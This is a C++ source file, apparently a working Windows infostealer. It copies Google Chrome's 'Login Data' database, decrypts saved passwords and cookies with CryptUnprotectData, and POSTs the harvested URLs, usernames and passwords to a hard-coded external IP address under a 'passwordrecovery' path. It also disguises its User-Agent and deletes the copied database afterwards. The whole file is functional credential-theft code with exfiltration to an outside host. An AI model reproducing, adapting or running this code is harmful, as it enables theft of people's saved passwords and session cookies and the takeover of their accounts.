//
//  HTTPRequest
//
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <tchar.h>
#include "HTTPRequest.hpp"
#include "sqlite3.h"
#include <Wincrypt.h>
#include <windows.h>

#pragma warning(disable:4996)
#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
#pragma comment(lib, "Crypt32")


/*
** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
*/
std::stringstream getPass(
	sqlite3* db
) {
	std::stringstream dump(std::string("")); // String stream for our output
	const char* zSql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt* pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		std::cout << "statement failed rc = " << rc << std::endl;
		return dump;
	}
	std::cout << "statement prepared " << std::endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	//std::cout << "RC: " << rc << std::endl;
	while (rc == SQLITE_ROW) {
		dump << "#N_U#";
		dump << "#dark~#";
		dump << sqlite3_column_text(pStmt, 0); //URL
		dump << "#dark~#";
		dump << (char*)sqlite3_column_text(pStmt, 1); //User
		dump << "#dark~#";
		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char* c = (char*)decryptedPass.pbData;
		while (isprint(*c)) {
			dump << *c;
			c++;
		}
		
		dump << "#N_U#"; //Pass
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
std::stringstream getCookies(
	sqlite3* db
) {
	std::stringstream dump(std::string("")); // String stream for our output
	const char* zSql = "SELECT HOST_KEY,name,encrypted_value from cookies";
	sqlite3_stmt* pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		std::cout << "statement failed rc = " << rc << std::endl;
		return dump;
	}
	std::cout << "statement prepared " << std::endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	std::cout << "RC: " << rc << std::endl;
	while (rc == SQLITE_ROW) {
		dump << sqlite3_column_text(pStmt, 0) << std::endl;
		dump << (char*)sqlite3_column_text(pStmt, 1) << std::endl;

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(
			&encryptedPass, // In Data
			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
			NULL,           // Optional entropy
			NULL,           // Reserved
			NULL,           // Here, the optional
							// prompt structure is not
							// used.
			0,
			&decryptedPass);
		char* c = (char*)decryptedPass.pbData;
		while (isprint(*c)) {
			dump << *c;
			c++;
		}
		dump << std::endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
sqlite3* getDBHandler(char* dbFilePath) {
	sqlite3* db;
	int rc = sqlite3_open(dbFilePath, &db);
	if (rc)
	{
		std::cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << std::endl << std::endl;
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		std::cout << dbFilePath << " DB Opened." << std::endl << std::endl;
		return db;
	}
}
//relative to chrome directory
bool copyDB(char* source, char* dest) {
	//Form path for Chrome's Login Data 
	std::string path = getenv("LOCALAPPDATA");
	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append(source);
	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	std::ifstream  src(path, std::ios::binary);
	std::ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true; //ToDo: error handling
}
int deleleteDB(const char* fileName) {
	if (remove(fileName) != 0)
		std::cout << "Could not delete " << fileName << std::endl;
	else
		std::cout << fileName << " deleted... Bye bye" << std::endl;
	return 1;
}


int main(int argc, const char * argv[])
{
	std::string url = "http://35.204.135.202/passwordrecovery";
    std::string method = "POST";
    std::string arguments;
    std::string output;
	int rc;
	// Open Database
	std::cout << "Copying db ..." << std::endl;
	copyDB("Login Data", "passwordsDB");
	sqlite3* passwordsDB = getDBHandler("passwordsDB");
	//StringStream.str()
	std::string passwords = getPass(passwordsDB).str();
	arguments = "pass=" + passwords;
	std::cout << arguments;
	if (sqlite3_close(passwordsDB) == SQLITE_OK)
		std::cout << "DB connection closed properly" << std::endl;
	else
		std::cout << "Failed to close DB connection" << std::endl;


    try
    {
        http::Request request(url);

        http::Response response = request.send(method, arguments, {
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: runscope/0.1"
        });

        if (!output.empty())
        {
            std::ofstream outfile(output, std::ofstream::binary);
            outfile.write(reinterpret_cast<const char*>(response.body.data()),
                          static_cast<std::streamsize>(response.body.size()));
        }
        else
            std::cout << std::string(response.body.begin(), response.body.end()) << std::endl;
    }
    catch (const std::exception& e)
    {
        std::cerr << "Request failed, error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
